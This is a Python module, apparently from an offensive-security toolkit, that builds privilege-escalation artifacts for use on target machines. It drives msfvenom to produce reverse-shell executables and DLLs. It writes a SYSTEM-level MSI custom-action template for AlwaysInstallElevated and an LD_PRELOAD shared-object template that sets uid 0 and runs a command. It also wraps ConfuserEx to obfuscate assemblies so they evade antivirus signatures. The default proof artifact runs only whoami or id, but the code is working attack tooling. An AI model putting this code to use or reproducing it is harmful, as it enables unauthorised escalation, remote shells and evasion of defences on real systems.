"""Payload build layer — drive the operator's builders to produce a needed artifact.

fieldkit proves escalation by *running* a vector; a few vectors need an artifact that
does not ship — a SYSTEM ``.msi`` for AlwaysInstallElevated, a payload ``.exe``/``.dll``
for a service hijack, a preload ``.so``. This module is the engine's awareness of *how*
each format is produced: a recipe over the operator's existing builders (``msfvenom``,
``wixl``, ``gcc``, ``mingw-w64``), driven through the injected runner exactly like nxc
and certipy elsewhere.

It **orchestrates; it does not embed payloads.** The bytes come from the operator's kit
(``msfvenom`` owns the shellcode/encoding) or operator-supplied ``--source``; fieldkit
templates only benign scaffolding — a WiX ``.wxs`` and a ``.c`` that run a command — and
*by default builds a proof artifact that runs ``whoami``/``id``*, the same evidence-first
stance as the privesc vectors. An operator who wants a reverse shell passes
``--lhost``/``--lport`` (msfvenom selects the payload) or brings their own ``--source``.

Preconditions are honest: :func:`have` / :func:`toolchain` report which builders are on
PATH, so :mod:`fieldkit.arsenal` can say a BUILD route is ready only when its builder is
actually installed — and the escalate loop advances (rather than pretending) when it is
not.
"""
import os
import shutil
import tempfile
from dataclasses import dataclass

from . import runner as runner_mod

#: format -> the builder binary that produces it (the default path).
BUILDER = {"exe": "msfvenom", "dll": "msfvenom", "ps1": "msfvenom",
           "msi": "wixl", "so": "gcc"}

#: --arch -> the mingw cross-compiler, when building from operator ``--source``.
MINGW = {"x64": "x86_64-w64-mingw32-gcc", "x86": "i686-w64-mingw32-gcc"}

#: every tool a full build capability wants — for `poc --check`.
TOOLS = ("msfvenom", "wixl", "gcc", "x86_64-w64-mingw32-gcc", "i686-w64-mingw32-gcc")


@dataclass(frozen=True)
class BuildResult:
    """The outcome of a build: the artifact path on success, else why it failed."""

    ok: bool
    fmt: str
    path: str = None
    tool: str = None
    detail: str = ""


def _proof(fmt):
    """The default benign command the artifact runs — evidence, not a payload."""
    return "id" if fmt == "so" else "cmd /c whoami"


def _arch(arch):
    return "x64" if arch in ("x64", "x86_64", "amd64", None) else "x86"


def _msf_windows(arch, command, lhost, lport):
    """(payload, extra-args) for msfvenom. A revshell when lhost/lport given, else the
    ``exec`` payload that just runs ``command`` — msfvenom owns the bytes either way."""
    base = "windows/x64/" if _arch(arch) == "x64" else "windows/"
    if lhost and lport:
        return base + "shell_reverse_tcp", [f"LHOST={lhost}", f"LPORT={lport}"]
    return base + "exec", [f"CMD={command}"]


# ---- templates (benign scaffolding — run a command, no shellcode/bypass) -----

_WXS = """<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="Update" Language="1033" Version="1.0.0.0"
           Manufacturer="Vendor" UpgradeCode="12345678-1234-1234-1234-123456789012">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine"/>
    <Media Id="1" Cabinet="a.cab" EmbedCab="yes"/>
    <Directory Id="TARGETDIR" Name="SourceDir"/>
    <CustomAction Id="Run" Execute="deferred" Impersonate="no" Directory="TARGETDIR"
                  ExeCommand="cmd /c {command}" Return="ignore"/>
    <InstallExecuteSequence>
      <Custom Action="Run" Before="InstallFinalize"/>
    </InstallExecuteSequence>
  </Product>
</Wix>
"""

_SO = """#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(void) {{
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("{command}");
}}
"""


def _xml_escape(s):
    return (s.replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;"))


def _c_escape(s):
    return s.replace("\\", "\\\\").replace('"', '\\"')


def _write(path, text):
    with open(path, "w") as fh:
        fh.write(text)


# ---- per-format builders: (RunResult, tool_name) -----------------------------

def _b_pe(fmt, out, *, arch, command, lhost, lport, source, workdir, run):
    if source:  # compile operator-supplied source with mingw
        cc = MINGW.get(_arch(arch), MINGW["x64"])
        argv = [cc, source, "-o", out] + (["-shared"] if fmt == "dll" else [])
        return run(argv), cc
    payload, extra = _msf_windows(arch, command, lhost, lport)
    return run(["msfvenom", "-p", payload, *extra, "-f", fmt, "-o", out]), "msfvenom"


def _b_msi(fmt, out, *, command, workdir, run, **_):
    wxs = os.path.join(workdir, "p.wxs")
    _write(wxs, _WXS.format(command=_xml_escape(command)))
    return run(["wixl", "-o", out, wxs]), "wixl"


def _b_so(fmt, out, *, command, workdir, run, **_):
    src = os.path.join(workdir, "p.c")
    _write(src, _SO.format(command=_c_escape(command)))
    return run(["gcc", "-shared", "-fPIC", "-o", out, src]), "gcc"


def _b_ps1(fmt, out, *, arch, command, lhost, lport, run, **_):
    payload, extra = _msf_windows(arch, command, lhost, lport)
    return run(["msfvenom", "-p", payload, *extra, "-f", "psh-reflection", "-o", out]), \
        "msfvenom"


RECIPES = {"exe": _b_pe, "dll": _b_pe, "msi": _b_msi, "so": _b_so, "ps1": _b_ps1}


# ---- the public build entrypoint --------------------------------------------

def build(fmt, out, *, arch="x64", command=None, lhost=None, lport=None,
          source=None, run=None, workdir=None):
    """Produce a ``fmt`` artifact at ``out`` by driving the right builder.

    ``command`` (default: a ``whoami``/``id`` proof) is what the artifact runs;
    ``lhost``/``lport`` switch msfvenom to a reverse shell; ``source`` compiles an
    operator ``.c`` with mingw instead of msfvenom. ``run`` is injected for testing.
    Returns a :class:`BuildResult` — never raises for a missing builder or a nonzero
    compile (the loop reads ``ok`` and moves on).
    """
    fmt = fmt.lower()
    if fmt not in RECIPES:
        return BuildResult(False, fmt, detail=f"unknown format {fmt!r} "
                           f"(have: {', '.join(sorted(RECIPES))})")
    run = run or (lambda argv: runner_mod.run(argv, timeout=120))
    command = command or _proof(fmt)
    wd = workdir or tempfile.mkdtemp(prefix="fk-poc-")
    res, tool = RECIPES[fmt](fmt, out, arch=arch, command=command, lhost=lhost,
                             lport=lport, source=source, workdir=wd, run=run)
    if getattr(res, "error", None):
        return BuildResult(False, fmt, tool=tool, detail=res.error)
    if getattr(res, "exit_code", 0) not in (0, None):
        tail = (getattr(res, "output", "") or "")[-200:].strip()
        return BuildResult(False, fmt, tool=tool, detail=f"{tool} exited "
                           f"{res.exit_code}: {tail}")
    return BuildResult(True, fmt, path=out, tool=tool, detail=f"built {fmt} with {tool}")


# ---- toolchain awareness ----------------------------------------------------

def have(fmt):
    """True when the default builder for ``fmt`` is installed on PATH."""
    tool = BUILDER.get(fmt.lower())
    return bool(tool and shutil.which(tool))


def toolchain():
    """``[(tool, path_or_None)]`` for every builder — for ``fieldkit poc --check``."""
    return [(t, shutil.which(t)) for t in TOOLS]


# ---- ConfuserEx obfuscation --------------------------------------------------
# Orchestration only: fieldkit generates the .crproj and drives the operator's ConfuserEx
# CLI — it never ships or embeds an obfuscator (same boundary as msfvenom/wixl/gcc). Turns
# a compiled .NET assembly (e.g. a Potato .exe) into an obfuscated variant that clears the
# on-disk signature for the native rung; the in-memory rung stays the AMSI-bypass path.

#: ConfuserEx protections applied by default (id -> as named in a .crproj rule).
CONFUSER_PROTECTIONS = ("anti debug", "constants", "ctrl flow", "rename")


def _wrap_confuser(path):
    """(argv-prefix, path): a ``.exe`` CLI runs under mono; a native CLI runs directly.
    Returns (None, path) when a ``.exe`` needs mono and mono is absent."""
    if path.lower().endswith(".exe"):
        mono = shutil.which("mono")
        return ([mono, path], path) if mono else (None, path)
    return ([path], path)


def _confuser_cli(override=None):
    """(argv-prefix, display-path) for the ConfuserEx CLI, or (None, None).

    An explicit ``override`` (config/flag) is trusted as given — the operator knows their
    path; a wrong one surfaces when the run fails. Otherwise PATH is searched, preferring a
    native CLI over a ``.exe`` that would need mono.
    """
    if override:
        return _wrap_confuser(override)
    fallback = None
    for n in ("Confuser.CLI", "ConfuserEx.CLI", "confuser-cli",
              "Confuser.CLI.exe", "ConfuserEx.CLI.exe"):
        p = shutil.which(n)
        if not p:
            continue
        prefix, path = _wrap_confuser(p)
        if prefix:
            return prefix, path
        fallback = fallback or (None, path)   # a .exe found but mono missing
    return fallback or (None, None)


def confuser(override=None):
    """The resolved ConfuserEx CLI display-path, or None — for ``poc --check``."""
    return _confuser_cli(override)[1]


def _crproj(basedir, outdir, module, protections):
    rules = "".join(f'    <protection id="{_xml_escape(p)}" />\n' for p in protections)
    return (f'<project outputDir="{_xml_escape(outdir)}" baseDir="{_xml_escape(basedir)}" '
            'xmlns="http://confuser.codeplex.com">\n'
            '  <rule pattern="true" inherit="false">\n'
            f'{rules}'
            '  </rule>\n'
            f'  <module path="{_xml_escape(module)}" />\n'
            '</project>\n')


def obfuscate(input_path, out, *, protections=None, cli=None, run=None, workdir=None):
    """Obfuscate a compiled .NET assembly with ConfuserEx; return a :class:`BuildResult`.

    fieldkit writes the ``.crproj`` and drives the CLI through the injected ``run`` — it
    never embeds obfuscation. ``cli`` overrides CLI discovery; ``run`` is injected for tests.
    Never raises for a missing CLI or a nonzero run (the caller reads ``ok``).
    """
    if not os.path.exists(input_path):
        return BuildResult(False, "confuser", detail=f"input not found: {input_path}")
    prefix, cli_path = _confuser_cli(cli)
    if not prefix:
        hint = ("ConfuserEx CLI not found — install it and `config set confuser_cli=<path>` "
                "(or pass --confuser). A .exe CLI also needs mono on PATH."
                if not cli_path else
                f"found {cli_path} but mono is not on PATH (needed to run a .exe CLI)")
        return BuildResult(False, "confuser", tool="ConfuserEx", detail=hint)
    wd = workdir or tempfile.mkdtemp(prefix="fk-confuser-")
    basedir = os.path.dirname(os.path.abspath(input_path)) or "."
    module = os.path.basename(input_path)
    outdir = os.path.join(wd, "obf")
    proj = os.path.join(wd, "fk.crproj")
    _write(proj, _crproj(basedir, outdir, module, protections or CONFUSER_PROTECTIONS))
    run = run or (lambda argv: runner_mod.run(argv, timeout=300))
    res = run(prefix + [proj])
    if getattr(res, "error", None):
        return BuildResult(False, "confuser", tool="ConfuserEx", detail=res.error)
    if getattr(res, "exit_code", 0) not in (0, None):
        tail = (getattr(res, "output", "") or "")[-200:].strip()
        return BuildResult(False, "confuser", tool="ConfuserEx",
                           detail=f"ConfuserEx exited {res.exit_code}: {tail}")
    produced = os.path.join(outdir, module)
    if not os.path.exists(produced):
        return BuildResult(False, "confuser", tool="ConfuserEx",
                           detail=f"ConfuserEx ran but produced no output at {produced}")
    try:
        os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
        shutil.move(produced, out)
    except OSError as exc:
        return BuildResult(False, "confuser", tool="ConfuserEx", detail=str(exc))
    return BuildResult(True, "confuser", path=out, tool="ConfuserEx",
                       detail=f"obfuscated {module} with ConfuserEx")
